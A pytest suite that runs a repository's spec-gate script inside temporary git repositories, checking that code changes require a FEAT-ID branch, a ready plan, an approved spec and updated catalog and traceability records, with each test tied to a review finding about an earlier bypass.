"""The spec gate refuses code that has no FEAT-ID branch, ready plan and approved spec.

Every test here RUNS scripts/gate/spec_gate.py inside a throwaway git
repository, the way the pre-commit hook (`--commit`) and the spec-gate
workflow (`--pr BASE HEAD`) run it: a real index, real commits, real
`git diff`. Nothing is stubbed. The script is byte-identical in solyra, so
this suite covers both repositories.

One test per Codex finding on stocks#1205 and solyra#72, named in its
docstring; a finding both repositories received is one test. Each was run
against the gate at 71a9bbce first and failed there for the reason its
finding gives.
"""
from __future__ import annotations

import datetime
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

TODAY = datetime.date.today().isoformat()   # the head commit's date, which Last reviewed must equal

REPO = Path(__file__).resolve().parents[2]
GATE = REPO / "scripts/gate/spec_gate.py"
WORKFLOW = REPO / ".github/workflows/spec-gate.yml"

CATALOG = "docs/product/02-FEATURE-CATALOG.md"
REQUIREMENTS = "docs/product/01-PRODUCT-REQUIREMENTS.md"
TRACEABILITY = "docs/product/12-PR-ISSUE-TRACEABILITY.md"
SPEC = "docs/superpowers/specs/2026-09-01-model-decisions.md"
PLAN = "docs/superpowers/plans/2026-09-01-model-decisions.md"
BRANCH = "feature/feat-model-001-model-decisions"
DONE = ["every model states its decision", "the registry test passes"]
CODE = {"lib/model.py": "DECISION = 'direction'\n"}
NOT_A_FEAT_BRANCH = "is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>"

CATALOG_TEXT = """\
# Feature Catalog

| ID | Area | Status | Last reviewed | PRs |
|---|---|---|---|---|
| [FEAT-MODEL-001](#feat-model-001) | Models | Production | unknown | none |
| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |

## Capability records

### FEAT-MODEL-001

- Status: Production

### FEAT-DATA-001

- Status: Production
"""

REQUIREMENTS_TEXT = """\
# Product Requirements

**REQ-MODEL-001:** Every model states the decision it produces.

**REQ-DATA-001:** A missing value is never a zero.
"""


def front(**fields) -> str:
    """A markdown file whose frontmatter is `fields`; a list renders as `  - item` lines."""
    lines = ["---"]
    for key, value in fields.items():
        if isinstance(value, list):
            lines.append(f"{key}:")
            lines += [f"  - {item}" for item in value]
        else:
            lines.append(f"{key}: {value}")
    return "\n".join(lines + ["---", "", "# Body", ""])


def spec(**over) -> str:
    return front(**{"feat_id": "FEAT-MODEL-001", "req_ids": "[REQ-MODEL-001]",
                    "done_when": DONE, "status": "approved", **over})


def plan(**over) -> str:
    return front(**{"feat_id": "FEAT-MODEL-001", "spec": SPEC, "branch": BRANCH,
                    "status": "ready", **over})


def body(ticked: bool = False, spec_path: str = SPEC, plan_path: str | None = PLAN) -> str:
    box = "x" if ticked else " "
    links = [f"Spec: {spec_path}"] + ([f"Plan: {plan_path}"] if plan_path else [])
    return "\n".join(links + [""] + [f"- [{box}] {item}" for item in DONE])


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=cwd, check=True,
                          capture_output=True, text=True).stdout.strip()


def write(repo: Path, path: str, text: str) -> None:
    p = repo / path
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


@pytest.fixture
def repo(tmp_path):
    """`main` holds the gate, a catalog, requirements, one approved spec and its
    ready plan, and one code file. Tag `base` marks it; every change branches
    from there."""
    _git(tmp_path, "init", "-q", "-b", "main")
    _git(tmp_path, "config", "user.email", "t@example.com")
    _git(tmp_path, "config", "user.name", "t")
    _git(tmp_path, "config", "commit.gpgsign", "false")
    write(tmp_path, "scripts/gate/spec_gate.py", GATE.read_text(encoding="utf-8"))
    write(tmp_path, CATALOG, CATALOG_TEXT)
    write(tmp_path, REQUIREMENTS, REQUIREMENTS_TEXT)
    write(tmp_path, SPEC, spec())
    write(tmp_path, PLAN, plan())
    write(tmp_path, "lib/model.py", "DECISION = 'size'\n")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-q", "-m", "base")
    _git(tmp_path, "tag", "base")
    return tmp_path


def gate(repo: Path, *args: str, **env: str) -> subprocess.CompletedProcess:
    # Only what the hook and the workflow pass in: nothing leaks from the shell running pytest.
    inherited = {k: v for k, v in os.environ.items() if not k.startswith(("PR_", "SPEC_GATE_", "GIT_"))}
    return subprocess.run([sys.executable, "scripts/gate/spec_gate.py", *args], cwd=repo,
                          env={**inherited, **env}, capture_output=True, text=True)


def on_base(repo: Path, files: dict[str, str | None]) -> None:
    """Commit `files` on main and move the `base` tag there: what a change is measured against.
    The catalog row and the approved spec are read from the base, never from the change."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "main")
    for path, text in files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "on base")
    _git(repo, "tag", "-f", "base")


def pr(repo: Path, branch: str, files: dict[str, str | None], **env: str) -> subprocess.CompletedProcess:
    """A pull request from `branch`, cut from base, that writes `files` (None deletes one),
    judged the way the spec-gate workflow judges it."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "-B", branch, "base")
    for path, text in files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", f"change on {branch}")
    return gate(repo, "--pr", "base", "HEAD", **{"PR_HEAD_REF": branch, **env})


def test_the_gate_cannot_be_edited_outside_chore_and_ci_runs_the_base_copy(repo):
    """stocks#1205 r4116983555 (spec_gate.py:116, P1); solyra#72 r4117710094 (:116).

    The old gate left scripts/gate/ ungated on every branch and CI ran the PR's
    own copy, so a PR could swap the gate for a no-op. The gate's files are code
    now, allowed only on chore/, and CI runs the copy on the base branch.
    """
    edit = {"scripts/gate/spec_gate.py": GATE.read_text(encoding="utf-8") + "# tweak\n"}
    r = pr(repo, "tweak-gate", edit)
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "chore/gate-fix", edit).returncode == 0

    workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    # One trigger and one job: the head-executing registry check is its own workflow, so a
    # run never creates a skipped twin of the other's job (stocks#1205 r4118475509, P1).
    assert list(workflow.get("on", workflow.get(True))) == ["pull_request_target"]
    assert list(workflow["jobs"]) == ["gate"]
    gate_job = workflow["jobs"]["gate"]
    checkout = next(s for s in gate_job["steps"] if s.get("uses", "").startswith("actions/checkout"))
    assert checkout["with"]["ref"] == "${{ github.event.pull_request.base.sha }}"
    assert not any("export_model_registry" in s.get("run", "") for s in gate_job["steps"])


def test_deploy_and_config_files_are_gated(repo):
    """stocks#1205 r4116983558 (spec_gate.py:33, P1).

    The old gate looked only under lib/ gcp/ platform/ scripts/ src/, so a
    Dockerfile, a deploy workflow or a dependency manifest passed on any branch.
    Everything but documentation is gated; chore/ may touch manifests only.
    """
    ops = {"Dockerfile": "FROM python:3.12\n",
           "docker-compose.yml": "services: {}\n",
           ".github/workflows/deploy-staging.yml": "name: deploy\n"}
    r = pr(repo, "tweak-deploy", ops)
    assert r.returncode == 1 and "changes 3 gated file(s)" in r.stdout, r.stdout
    assert pr(repo, "chore/deploy", ops).returncode == 1
    manifest = {"requirements.txt": "requests==2.32.3\n"}
    assert pr(repo, "tweak-deps", manifest).returncode == 1
    assert pr(repo, "chore/bump-requests", manifest).returncode == 0


def test_root_entry_points_and_public_assets_are_gated(repo):
    """solyra#72 r4116980734 (spec_gate.py:32, P1).

    vite.config.ts, index.html and public/ change what the app builds and
    serves; the old gate looked only under src/.
    """
    r = pr(repo, "tweak-shell", {"vite.config.ts": "export default {}\n",
                                 "index.html": "<!doctype html>\n",
                                 "public/robots.txt": "User-agent: *\n"})
    assert r.returncode == 1 and "changes 3 gated file(s)" in r.stdout, r.stdout


def test_branch_names_exempt_no_code(repo):
    """stocks#1205 r4117017697 (spec_gate.py:137, P1); solyra#72 r4117710091 (:137, P1).

    The old gate returned before reading the diff on main, docs/, chore/ and
    spike/ branches, and a fork's PR from its own `main` arrives named `main`.
    A prefix now only lets a same-repository PR touch manifests, the gate's
    files, or the vendored skills; a fork's PR gets no allowance at all.
    """
    fork = {"PR_HEAD_REPO": "someone/stocks", "PR_BASE_REPO": "TeneikaAskew/stocks"}
    code = {**CODE, "src/App.tsx": "export {}\n"}
    runs = {name: pr(repo, name, code, **env)
            for name, env in (("main", fork), ("docs/typo", {}), ("chore/bypass", {}), ("spike/try", {}))}
    assert all(r.returncode == 1 for r in runs.values()), {n: r.stdout for n, r in runs.items()}
    assert "A pull request from a fork gets no prefix allowance." in runs["main"].stdout
    manifest = {"package-lock.json": "{}\n"}   # a new package.json is a new project, see the dependency-fields test
    assert pr(repo, "chore/deps", manifest).returncode == 0
    assert pr(repo, "chore/deps", manifest, **fork).returncode == 1


def test_the_branch_is_feature_or_fix_with_the_feat_id_first(repo):
    """stocks#1205 r4116983566 (spec_gate.py:146); solyra#72 r4116980730 (:141).

    The old gate searched the whole branch name for a FEAT-ID, so
    `release-FEAT-MODEL-001-temp` passed once a plan named it.
    """
    for name in ("release-FEAT-MODEL-001-temp", "experiment-feat-model-001-x", "feature/x-feat-model-001"):
        r = pr(repo, name, {**CODE, PLAN: plan(branch=name)})
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (name, r.stdout)
    assert pr(repo, BRANCH, CODE).returncode == 0


def test_a_superseded_spec_authorizes_nothing(repo):
    """stocks#1205 r4116983561 (spec_gate.py:155).

    The old gate took the newest APPROVED spec for the FEAT-ID, skipping a newer
    draft that replaces it, so the stale approval authorized the change. The
    spec is the one the plan names, and it fails once another spec supersedes
    it or it is marked superseded.
    """
    newer = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    on_base(repo, {newer: spec(supersedes=SPEC)})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and f"{SPEC} is superseded by {newer}" in r.stdout, r.stdout
    # solyra#72 r4118481058: a draft, or another feature's spec, naming this one does not replace it
    on_base(repo, {newer: spec(status="draft", supersedes=SPEC)})
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {newer: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", supersedes=SPEC)})
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "is status: superseded" in r.stdout, r.stdout


def test_the_plan_names_the_spec_that_is_enforced(repo):
    """stocks#1205 r4116983576 (spec_gate.py:111); solyra#72 r4116980726 (:151, P1).

    The old gate found an approved spec by FEAT-ID on its own and only checked
    that the plan's `spec:` path existed, so a plan could point at another
    feature's spec, or at a newer draft, and still pass.
    """
    other = "docs/superpowers/specs/2026-09-02-data-nulls.md"
    draft = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    on_base(repo, {other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]"), draft: spec(status="draft")})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=other)})
    assert r.returncode == 1 and "the plan's spec serves FEAT-DATA-001, not FEAT-MODEL-001" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=draft)})
    assert r.returncode == 1 and f"{draft} is still status: draft" in r.stdout, r.stdout


def test_only_a_ready_plan_authorizes_code(repo):
    """stocks#1205 r4117017702 (spec_gate.py:108).

    The old gate required a `status` key and never read its value, so a draft
    plan, or a done one reused on a recreated branch, authorized code.
    """
    runs = {s: pr(repo, BRANCH, {**CODE, PLAN: plan(status=s)}) for s in ("draft", "done", "whatever")}
    assert all(r.returncode == 1 for r in runs.values()), {s: r.stdout for s, r in runs.items()}
    assert "authorizes implementation only while status: ready" in runs["done"].stdout
    assert "status must be ready | done" in runs["whatever"].stdout


def test_the_plan_is_the_one_naming_this_branch(repo):
    """stocks#1205 r4117017705 (spec_gate.py:160).

    The old gate took the newest plan for the FEAT-ID and refused every other
    branch, so two changes under one FEAT-ID could not run side by side. The
    plan is the one whose `branch:` is this branch, and it must be the only one.
    """
    second = "docs/superpowers/plans/2026-09-05-model-decisions-docs.md"
    on_base(repo, {second: plan(branch="feature/feat-model-001-other")})   # another branch's plan, on the base
    assert pr(repo, BRANCH, CODE).returncode == 0
    on_base(repo, {second: plan()})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "one plan = one branch" in r.stdout, r.stdout


def test_done_when_and_the_other_list_fields_must_be_lists(repo):
    """stocks#1205 r4116983587 (spec_gate.py:102); solyra#72 r4116980740 (:102).

    The old gate checked emptiness only when done_when parsed as a list, so
    `done_when: TBD` or `done_when: ""` authorized code with nothing to
    verify. issues and canvases get the same type check.
    """
    for value in ("TBD", '""'):
        on_base(repo, {SPEC: spec(done_when=value)})
        r = pr(repo, BRANCH, CODE)
        assert r.returncode == 1 and "done_when must be a non-empty list" in r.stdout, (value, r.stdout)
    on_base(repo, {SPEC: spec(issues="#12")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "issues must be a list" in r.stdout, r.stdout


def test_req_ids_name_defined_requirements(repo):
    """stocks#1205 r4117591702 (spec_gate.py:98).

    The old gate never read req_ids. Each must be shaped REQ-XXX-000 and, where
    the requirements doc defines IDs (stocks), be one of them. Solyra has no
    requirements doc, so there the check is shape only.
    """
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids not defined in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[REQ-DOES-NOT-EXIST-999]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "not shaped REQ-XXX-000" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids must be a non-empty list" in r.stdout, r.stdout
    # stocks#1205 r4119001312: a definition inside a comment or a fence is retired, not live
    hidden = REQUIREMENTS_TEXT + "\n<!-- **REQ-FAKE-999:** retired -->\n\n```\n**REQ-FAKE-998:** example\n```\n"
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]"), REQUIREMENTS: hidden})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "req_ids not defined in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(req_ids="[REQ-FAKE-999]"), REQUIREMENTS: None})
    assert pr(repo, BRANCH, CODE).returncode == 0
    # stocks#1205 r4118721673: a registry that exists but defines no IDs fails closed,
    # instead of silently accepting every shaped ID
    on_base(repo, {REQUIREMENTS: "# Requirements\n\nrewritten as prose, no bold REQ definitions\n\n"})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "defines no REQ-IDs" in r.stdout, r.stdout


def test_commit_mode_reads_what_is_staged(repo):
    """stocks#1205 r4117017699 (spec_gate.py:85); solyra#72 r4117710096 (:179).

    The old gate listed the staged files but read specs and plans from the
    working tree, so a plan staged as done and flipped to ready on disk
    passed, although the commit carries the done one.
    """
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, PLAN, plan(status="done"))
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", PLAN, "lib/model.py")
    write(repo, PLAN, plan())
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "authorizes implementation only while status: ready" in r.stdout, r.stdout
    _git(repo, "add", PLAN)
    assert gate(repo, "--commit").returncode == 0


def test_a_detached_head_commit_must_name_its_branch(repo):
    """stocks#1205 r4117591691 (spec_gate.py:30).

    A detached checkout reports its branch as `HEAD`, which the old gate
    exempted. A detached commit that stages code is refused with the override
    in the message; with the override the named branch is checked as usual.
    Documentation alone still commits.
    """
    _git(repo, "checkout", "-q", "--detach", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "docs/notes.md")
    assert gate(repo, "--commit").returncode == 0
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "SPEC_GATE_BRANCH=feature/<feat-id>-<slug> git commit" in r.stdout, r.stdout
    assert gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH).returncode == 0
    assert gate(repo, "--commit", SPEC_GATE_BRANCH="tweak").returncode == 1


def test_pr_title_and_body_name_what_the_gate_validated(repo):
    """stocks#1205 r4116983578 (spec_gate.py:131); solyra#72 r4117710098 (:126)
    and r4116980738 (:131).

    The old gate took any FEAT-ID in the title, any path under
    docs/superpowers/specs/ and any `- [` in the body, so the PR template's
    placeholders passed. The title starts with the branch's FEAT-ID; the body
    carries the plan's spec path and each done_when item as a checkbox line.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: state each model's decision", "PR_BODY": body()}
    assert pr(repo, BRANCH, CODE, **ok).returncode == 0
    r = pr(repo, BRANCH, CODE, **{**ok, "PR_TITLE": "FEAT-DATA-001: state each model's decision"})
    assert r.returncode == 1 and "PR title must start with 'FEAT-MODEL-001:'" in r.stdout, r.stdout
    placeholder = f"Spec: docs/superpowers/specs/....md\nPlan: {PLAN}\n\n- [ ] \n- [ ] \n"
    r = pr(repo, BRANCH, CODE, **{**ok, "PR_BODY": placeholder})
    assert r.returncode == 1, r.stdout
    assert f"PR body must link the spec the plan names: {SPEC}" in r.stdout
    assert "each done_when item as its own '- [ ]' line" in r.stdout


def test_pr_body_links_the_plan(repo):
    """stocks#1205 r4117591696 (spec_gate.py:131).

    The old body check never looked for the plan, one link of the
    FEAT-ID -> spec -> plan -> PR chain.
    """
    r = pr(repo, BRANCH, CODE, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(plan_path=None))
    assert r.returncode == 1 and f"PR body must link the plan: {PLAN}" in r.stdout, r.stdout


def test_close_out_records_are_required_once_the_pr_is_ready(repo):
    """stocks#1205 r4116983595 (spec_gate.py:167).

    The old gate passed a PR that left the catalog and the traceability record
    stale. A draft is work in progress and is not checked. Once ready: every
    done_when box ticked, the catalog row or record changed, and the PR number
    added under its FEAT-ID in 12-PR-ISSUE-TRACEABILITY.md, or in the catalog
    row's PRs column where a repository has no such doc (solyra).
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42"}
    recorded = {**CODE, PLAN: plan(pr=42)}
    assert pr(repo, BRANCH, recorded, **meta, PR_DRAFT="true").returncode == 0
    r = pr(repo, BRANCH, recorded, **meta, PR_DRAFT="false")
    assert r.returncode == 1, r.stdout
    assert "Last reviewed" in r.stdout and "add this PR (#42)" in r.stdout

    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    assert pr(repo, BRANCH, {**recorded, CATALOG: row}, **meta, PR_DRAFT="false").returncode == 0
    # solyra#72 r4118997596: a PR cannot bring its own traceability document to move the
    # lineage check off the catalog row; which record carries it is read at the base
    stamped_only = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | none |")
    own_trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 state each model's decision\n"
    r = pr(repo, BRANCH, {**recorded, CATALOG: stamped_only, TRACEABILITY: own_trace}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "row's PRs column" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**recorded, CATALOG: row}, **{**meta, "PR_BODY": body()}, PR_DRAFT="false")
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout

    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n\n## FEAT-DATA-001\n\n- #42 state each model's decision\n"
    on_base(repo, {TRACEABILITY: trace})   # the other capability's section is not this change's to add
    r = pr(repo, BRANCH, {**recorded, CATALOG: row, TRACEABILITY: trace}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "add this PR (#42) to the FEAT-MODEL-001 section's PR lineage" in r.stdout, r.stdout
    trace = trace.replace("- none\n", "- #42 state each model's decision\n")
    assert pr(repo, BRANCH, {**recorded, CATALOG: row, TRACEABILITY: trace}, **meta, PR_DRAFT="false").returncode == 0


RECORD = """
### FEAT-MODEL-001

| Field | Value |
|---|---|
| Status | Production |
| Last reviewed | 2026-08-30 |
"""


def test_close_out_checks_the_status_and_last_reviewed_fields(repo):
    """stocks#1205 r4117897774 (spec_gate.py:348); solyra#72 r4117890531 (:348).

    The close-out passed on any added catalog line that mentioned the FEAT-ID
    or sat in its section: a blank line in the stocks record, or the solyra
    row's PRs cell alone. It now reads the FEAT's Last reviewed and Status,
    from the record's field table (stocks) or the row's columns (solyra):
    Last reviewed must move to a date, and Status must be set.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    trace = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 state each model's decision\n"
    base = {**CODE, PLAN: plan(pr=42), TRACEABILITY: trace}

    # solyra shape: the PRs cell alone, Last reviewed left at unknown
    only_prs = CATALOG_TEXT.replace("| Production | unknown | none |", "| Production | unknown | #42 |", 1)
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: only_prs}, **meta)
    assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout

    # stocks shape: the record carries the fields; base it, then touch it without changing them
    stocks_catalog = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production\n", RECORD.lstrip("\n"))
    _git(repo, "checkout", "-q", "main")
    write(repo, CATALOG, stocks_catalog)
    write(repo, TRACEABILITY, "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "stocks-shaped catalog and traceability record")
    _git(repo, "tag", "-f", "base")
    blank = stocks_catalog.replace("| Last reviewed | 2026-08-30 |\n", "| Last reviewed | 2026-08-30 |\n\n")
    mention = stocks_catalog + "\nFEAT-MODEL-001 was touched.\n"
    for catalog in (blank, mention):
        r = pr(repo, BRANCH, {**base, CATALOG: catalog}, **meta)
        assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout
    unset = stocks_catalog.replace("| Status | Production |", "| Status | TBD |").replace("2026-08-30", TODAY)
    r = pr(repo, BRANCH, {**base, CATALOG: unset}, **meta)
    assert r.returncode == 1 and "Status" in r.stdout, r.stdout
    stamped = stocks_catalog.replace("2026-08-30", TODAY)
    r = pr(repo, BRANCH, {**base, CATALOG: stamped}, **meta)
    assert r.returncode == 0, r.stdout
    # stocks#1205 r4118721669: the fields were read from the raw document, so a
    # commented-out or fenced row after the table overrode the visible one
    for hidden in (f"<!-- | Last reviewed | {TODAY} | -->", f"```\n| Last reviewed | {TODAY} |\n```"):
        section_end = stocks_catalog.index("| Last reviewed | 2026-08-30 |\n") + len("| Last reviewed | 2026-08-30 |\n")
        catalog = stocks_catalog[:section_end] + "\n" + hidden + "\n" + stocks_catalog[section_end:]
        r = pr(repo, BRANCH, {**base, CATALOG: catalog}, **meta)
        assert r.returncode == 1 and "Last reviewed" in r.stdout, (hidden, r.stdout)
    # solyra#72 r4119505526: FEAT-MODEL-0010 is not FEAT-MODEL-001's heading
    lookalike_trace = "# Traceability\n\n## FEAT-MODEL-0010\n\n- #42 second cut\n"
    r = pr(repo, BRANCH, {**base, CATALOG: stamped, TRACEABILITY: lookalike_trace}, **meta)
    assert r.returncode == 1 and "add this PR (#42)" in r.stdout, r.stdout
    # solyra#72 r4119234373: #42abc is not a reference to PR #42
    glued = stocks_catalog.replace("2026-08-30", TODAY)
    trace_glued = "# Traceability\n\n## FEAT-MODEL-001\n\n- #42abc second cut\n"   # base: stocks_catalog, lineage `- none`
    r = pr(repo, BRANCH, {**base, CATALOG: glued, TRACEABILITY: trace_glued}, **meta)
    assert r.returncode == 1 and "add this PR (#42)" in r.stdout, r.stdout
    # stocks#1205 r4118788497: shaped like a date is not a date
    r = pr(repo, BRANCH, {**base, CATALOG: stocks_catalog.replace("2026-08-30", "2026-99-99")}, **meta)
    assert r.returncode == 1 and "Last reviewed" in r.stdout, r.stdout
    # solyra#72 r4118878756: the PRs cell and the lineage only grow; a ready PR cannot
    # replace the accumulated history with its own number
    prior = CATALOG_TEXT.replace("| Production | unknown | none |", "| Production | unknown | #7, #9 |", 1)
    on_base(repo, {CATALOG: prior, PLAN: plan(pr=42), TRACEABILITY: None})
    erased = prior.replace("| unknown | #7, #9 |", f"| {TODAY} | #42 |")
    r = pr(repo, BRANCH, {**CODE, CATALOG: erased}, **meta)
    assert r.returncode == 1 and "loses earlier PR(s) #7, #9" in r.stdout, r.stdout
    kept = prior.replace("| unknown | #7, #9 |", f"| {TODAY} | #7, #9, #42 |")
    assert pr(repo, BRANCH, {**CODE, CATALOG: kept}, **meta).returncode == 0
    on_base(repo, {CATALOG: stocks_catalog, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n"})
    r = pr(repo, BRANCH, {**base, CATALOG: stamped, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #42 second cut\n"}, **meta)
    assert r.returncode == 1 and "PR lineage loses earlier PR(s) #7" in r.stdout, r.stdout
    # stocks#1205 r4119001308: a second PR the same day cannot leave the record untouched
    same_day = stocks_catalog.replace("2026-08-30", TODAY)
    on_base(repo, {CATALOG: same_day, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n"})
    r = pr(repo, BRANCH, {**base, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n- #42 second cut\n"}, **meta)
    assert r.returncode == 1 and "record is unchanged from the base" in r.stdout, r.stdout
    touched = same_day.replace("| Status | Production |", "| Status | Production |\n| Notes | second cut, #42 |")
    r = pr(repo, BRANCH, {**base, CATALOG: touched, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- #7 first cut\n- #42 second cut\n"}, **meta)
    assert r.returncode == 0, r.stdout
    on_base(repo, {CATALOG: stocks_catalog, TRACEABILITY: "# Traceability\n\n## FEAT-MODEL-001\n\n- none\n"})
    # solyra#72 r4118831958: a real date that is not the head commit's is a false record
    for other in ("2000-01-01", "2099-01-01"):
        r = pr(repo, BRANCH, {**base, CATALOG: stocks_catalog.replace("2026-08-30", other)}, **meta)
        assert r.returncode == 1 and TODAY in r.stdout, r.stdout


def test_the_plan_records_its_pr(repo):
    """solyra#72 r4117890536 (spec_gate.py:70).

    Nothing read the plan's `pr:` field, so it could stay null or name another
    PR. It must be null or a PR number; a number that is not this PR fails in
    any PR run, and once the PR is ready it must be this PR.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr="null")}, **meta, PR_DRAFT="true").returncode == 0
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=41)}, **meta, PR_DRAFT="true")
    assert r.returncode == 1 and "names PR #41" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr="soon")}, **meta, PR_DRAFT="true")
    assert r.returncode == 1 and "pr must be null or a PR number" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, CATALOG: row, PLAN: plan(pr="null")}, **meta, PR_DRAFT="false")
    assert r.returncode == 1 and "set the plan's pr to 42" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, CATALOG: row, PLAN: plan(pr="#42")}, **meta, PR_DRAFT="false").returncode == 0


def test_every_branch_shape_the_rules_name_passes_only_its_own_work(repo):
    """stocks#1205 r4117897779 (SKILL.md:17, P1).

    AGENTS.md said every branch must be feature/ or fix/<feat-id>-<slug>, while
    the skill sends documentation to docs/, manifests to chore/, investigations
    to spike/ and the vendored skills to bot/superpowers-. AGENTS.md and
    CLAUDE.md now name all six shapes; this pins what the gate lets each carry.
    """
    skill_file = {".claude/skills/demo/helper.sh": "echo hi\n"}
    assert pr(repo, "docs/fix-typo", {"docs/notes.md": "# Notes\n"}).returncode == 0
    assert pr(repo, "docs/spec-feat-model-001", {"docs/superpowers/specs/2026-09-28-x.md": spec()}).returncode == 0
    # solyra#72 r4119296014: a spec landing alone is validated before the documentation return
    for bad in (spec(req_ids="[REQ-FAKE-999]"), spec(feat_id="FEAT-NOPE-001"), spec(done_when=[])):
        r = pr(repo, "docs/spec-feat-model-001", {"docs/superpowers/specs/2026-09-28-x.md": bad})
        assert r.returncode == 1 and "2026-09-28-x.md:" in r.stdout, r.stdout
    # stocks#1205 r4119509855: a plan is edited by its own branch; a docs/ branch may only close it
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(status="done")})
    assert r.returncode == 1 and "not yet in the base's record" in r.stdout, r.stdout   # r4119610907: no PR recorded yet
    on_base(repo, {PLAN: plan(pr=42), CATALOG: CATALOG_TEXT.replace("| Production | unknown | none |", f"| Production | {TODAY} | #42 |", 1)})
    assert pr(repo, "docs/plan-tweak", {PLAN: plan(pr=42, status="done")}).returncode == 0
    on_base(repo, {PLAN: plan(), CATALOG: CATALOG_TEXT})
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(branch="feature/feat-model-001-other")})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-tweak", {PLAN: plan(status="done", pr=99)})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-tweak", {PLAN: None})
    assert r.returncode == 1 and "a plan is not deleted" in r.stdout, r.stdout
    # solyra#72 r4119505520: nor is an approved spec deleted
